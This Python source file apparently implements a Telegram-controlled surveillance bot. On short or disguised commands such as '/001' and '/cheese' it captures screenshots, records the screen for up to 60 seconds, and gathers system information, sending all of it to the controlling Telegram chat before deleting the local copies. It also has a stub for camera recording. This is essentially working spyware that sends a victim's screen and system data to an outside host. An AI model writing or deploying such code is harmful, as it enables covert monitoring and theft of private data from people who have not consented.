import asyncio
import os
import types
import pyautogui
from aiogram import Bot, Dispatcher, types
from aiogram.filters.command import Command
from aiogram.types import FSInputFile
from getusersystem import get_system_info
from recording.screen_recording import record_screen
from dotenv import load_dotenv

load_dotenv()

DEFAULT_DURATION_SEC = 5
DEFAULT_FPS = 10
LOCALAPDATA_PATH = os.getenv('LOCALAPPDATA')
SCREEN_PATH = f'screenshot_from_olux.png'
VIDEO_PATH = f"Recorded_screen.mp4"
api_token = os.getenv('API_TOKEN')


async def main():
    bot = Bot(token=api_token)
    dp = Dispatcher()

    @dp.message(Command('001'))
    @dp.message(Command('cheese'))
    async def createScreenshot(message: types.Message):
        screen_oluxa = pyautogui.screenshot()
        screen_oluxa.save(SCREEN_PATH)
        output_photo = FSInputFile(SCREEN_PATH)

        await message.answer_photo(photo=output_photo)
        await message.answer(str(get_system_info()))
        os.remove(SCREEN_PATH)

    @dp.message(Command('002'))
    @dp.message(Command('screenView'))
    async def recording(message: types.Message):
        """/screenView <seconds> <fps>"""
        chat_id = message.chat.id
        duration = DEFAULT_DURATION_SEC
        fps = DEFAULT_FPS

        args = message.text.split()

        if len(args) > 1 and args[1].isdigit():
            requested_duration = int(args[1])
            if 1 <= requested_duration <= 60:  # Ограничение 60
                duration = requested_duration
            else:
                await message.answer("Длительность должна быть от 1 до 60 секунд")
                return

        if len(args) > 2 and args[2].isdigit():
            requested_fps = int(args[2])
            if 1 <= requested_fps <= 60:
                fps = requested_fps
            else:
                await message.answer("FPS должен быть от 1 до 60")
                return

        if len(args) == 1:
            await message.answer(
                f"Использую настройки по умолчанию: {duration} сек, {fps} FPS. "
                f"Для изменения используйте формат: `/000 <секунды> <фпс>`\n"
                f"Например: `/000 10 60`"
            )

        await message.answer(f"Начинаю запись экрана на {duration} секунд, {fps} FPS...")

        loop = asyncio.get_running_loop()
        try:
            success, error_msg = await loop.run_in_executor(
                None, record_screen, VIDEO_PATH, duration, fps
            )
        except Exception as e:
            await message.answer(f"Произошла ошибка при запуске записи: {e}")
            return

        if success and os.path.exists(VIDEO_PATH):
            await message.answer("Запись экрана завершена. Отправляю видео...")

            try:
                video_file = FSInputFile(VIDEO_PATH)

                await bot.send_video(
                    chat_id=chat_id,
                    video=video_file,
                    caption=f"Видео с экрана ({duration} сек, {fps} FPS)"
                )
                await message.answer("Видео успешно отправлено!")

            except Exception as e:
                await message.answer(f"Произошла ошибка при отправке видео: {e}")
            finally:
                os.remove(VIDEO_PATH)
                print(f"Локальный файл {VIDEO_PATH} удален.")

        else:
            await message.answer(f"❌ Не удалось записать экран. Причина: {error_msg}")

    @dp.message(Command('003'))
    @dp.message(Command('cameraView'))
    async def record_camera_video(message: types.Message):
        pass

    @dp.message(Command('004'))
    @dp.message(Command('usersystem'))
    async def getfullsysteminfo(message: types.Message):
        await message.answer(str(get_system_info(True)))

    await dp.start_polling(bot)
